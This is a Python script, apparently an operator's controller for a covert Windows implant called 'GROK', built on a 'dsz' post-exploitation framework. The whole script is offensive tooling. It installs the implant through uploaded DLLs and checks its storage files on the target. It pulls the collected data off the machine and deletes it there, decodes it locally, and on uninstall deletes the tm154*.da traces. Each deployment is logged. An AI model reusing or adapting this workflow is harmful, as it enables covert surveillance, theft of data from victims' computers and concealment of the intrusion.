
import dsz.lp
import dsz.version
import dsz.ui
import dsz.path
import dsz.file
import dsz.control
import dsz.menu
import dsz.env
tool = 'Grok'
version = '2.1.3.1'
fileName = 'msgk.dll'
resDir = dsz.lp.GetResourcesDirectory()
GROK_PATH = ('%s\\%s\\%s' % (resDir, tool, version))
logdir = dsz.lp.GetLogsDirectory()
EXE_PATH = ''

def grokverify(input):
    storageSuccessFlag = True
    success = True
    if dsz.file.Exists('tm154d.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154d.da dump file exists ... this should not be here', dsz.ERROR)
    if dsz.file.Exists('tm154p.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154p.da overflow file exists ... log may be full', dsz.ERROR)
    if dsz.file.Exists('tm154_.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154_.da config file exists ... ', dsz.GOOD)
    if dsz.file.Exists('tm154o.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154o.da storage file exists ... SUCCESSFUL', dsz.GOOD)
    else:
        dsz.ui.Echo('tm154o.da storage file missing ... FAILED', dsz.ERROR)
        storageSuccessFlag = False
    if (storageSuccessFlag == True):
        dsz.ui.Echo('GROK should be installed on target... only way to confirm is with DOUBLEFEATURE', dsz.GOOD)
    else:
        dsz.ui.Echo("GROK doesn't look like it is on target... only way to confirm is with DOUBLEFEATURE", dsz.ERROR)
        success = False
    return success

def dll_u(dllfile):
    dsz.ui.Echo(('Executing %s via dll_u' % dllfile))
    cmd = ('dll_u -library %s' % dllfile)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not execute %s via dll_u' % dllfile), dsz.ERROR)
        return False
    dsz.ui.Echo(('Successfully executed %s via dll_u' % dllfile))
    return True

def getpath():
    cmd = 'processinfo -minimal'
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    proc = dsz.cmd.data.Get('processinfo::modules::module::modulename', dsz.TYPE_STRING)[0]
    (path, file) = dsz.path.Split(proc)
    global EXE_PATH
    EXE_PATH = path
    return True

def collectfiles():
    dsz.ui.Echo(('Getting collection file, %s\\Tprf3~' % EXE_PATH))
    cmd = ('get %s\\Tprf3~' % EXE_PATH)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not get collection file, %s\\Tprf3~' % EXE_PATH), dsz.ERROR)
        return False
    getfilename = dsz.cmd.data.Get('FileLocalName::localname', dsz.TYPE_STRING)[0]
    dsz.ui.Echo(('Deleting collection file, %s\\Tprf3~' % EXE_PATH))
    cmd = ('delete %s\\Tprf3~' % EXE_PATH)
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo(('Could not delete collection file, %s\\Tprf3~' % EXE_PATH), dsz.ERROR)
        return False
    dsz.ui.Echo('Moving file to NOSEND directory...')
    dsz.control.echo.Off()
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\NOSEND' % logdir))
    dsz.cmd.Run(('local mkdir %s\\GetFiles\\Grok_Decrypted' % logdir))
    cmd = ('local move %s\\GetFiles\\%s %s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename, logdir, getfilename))
    runsuccess = dsz.cmd.Run(cmd)
    dsz.control.echo.On()
    success = parsefile(('%s\\GetFiles\\NOSEND\\%s' % (logdir, getfilename)))
    if (not success):
        return False
    return True

def parsefile(file):
    (path, filename) = dsz.path.Split(file)
    cmd = ('local run -command "%s\\Offline\\GkDecoder.exe %s %s\\GetFiles\\Grok_Decrypted\\%s.xml"' % (GROK_PATH, file, logdir, filename))
    dsz.control.echo.Off()
    runsuccess = dsz.cmd.Run(cmd, dsz.RUN_FLAG_RECORD)
    dsz.control.echo.On()
    if (not runsuccess):
        dsz.ui.Echo('There was an error parsing the collection', dsz.ERROR)
        return False
    return True

def grokparse(input):
    fullpath = dsz.ui.GetString('Please enter the full path to the file you want parse: ', '')
    if (fullpath == ''):
        dsz.ui.Echo('No string entered', dsz.ERROR)
        return False
    success = parsefile(fullpath)
    if (not success):
        return False
    return True

def grokinstall(input):
    success = dll_u(('%s\\Uploads\\msgki.dll' % GROK_PATH))
    if (not success):
        return False
    return True

def grokcollect(input):
    success = dll_u(('%s\\Uploads\\msgkd.dll' % GROK_PATH))
    if (not success):
        return False
    success = collectfiles()
    if (not success):
        return False
    return True

def grokuninstall(input):
    success = dll_u(('%s\\Uploads\\msgku.dll' % GROK_PATH))
    if (not success):
        return False
    collectfiles()
    if dsz.file.Exists('tm154*.da', ('%s\\..\\temp' % systemPath)):
        dsz.ui.Echo('tm154*.da files exist, deleting')
        cmd = ('delete -mask tm154*.da -path %s\\..\\temp' % systemPath)
        dsz.control.echo.Off()
        runsuccess = dsz.cmd.Run(cmd)
        dsz.control.echo.On()
        if (not runsuccess):
            dsz.ui.Echo('Failed to delete tm154*.da', dsz.ERROR)
    return True

def main():
    menuOption = 0
    if (not dsz.version.checks.IsWindows()):
        dsz.ui.Echo('GROK requires a Windows OS', dsz.ERROR)
        return 0
    if (not dsz.version.checks.IsOs64Bit()):
        dsz.ui.Echo(('GROK %s requires x64' % version), dsz.ERROR)
        return 0
    if dsz.path.windows.GetSystemPath():
        global systemPath
        systemPath = dsz.path.windows.GetSystemPath()
    else:
        dsz.ui.Echo('Could not find system path', dsz.ERROR)
        return 0
    getpath()
    menu_list = list()
    menu_list.append({dsz.menu.Name: 'Install', dsz.menu.Function: grokinstall})
    menu_list.append({dsz.menu.Name: 'Uninstall', dsz.menu.Function: grokuninstall})
    menu_list.append({dsz.menu.Name: 'Verify Install', dsz.menu.Function: grokverify})
    menu_list.append({dsz.menu.Name: 'Collect and Parse', dsz.menu.Function: grokcollect})
    menu_list.append({dsz.menu.Name: 'Parse Local', dsz.menu.Function: grokparse})
    while (menuOption != (-1)):
        (retvalue, menuOption) = dsz.menu.ExecuteSimpleMenu(('\n\n========================\nGrok %s Menu\n========================\n' % version), menu_list)
        if (menuOption == 0):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DEPLOYED', 'Unsuccessful')
        elif (menuOption == 1):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'DELETED', 'Unsuccessful')
        elif (menuOption == 2):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
        elif (menuOption == 3):
            if (retvalue == True):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Successful')
            if (retvalue == False):
                dsz.lp.RecordToolUse(tool, version, 'EXERCISED', 'Unsuccessful')
    dsz.ui.Echo('***************************')
    dsz.ui.Echo('*  GROK script completed. *')
    dsz.ui.Echo('***************************')
    return 0
if (__name__ == '__main__'):
    main()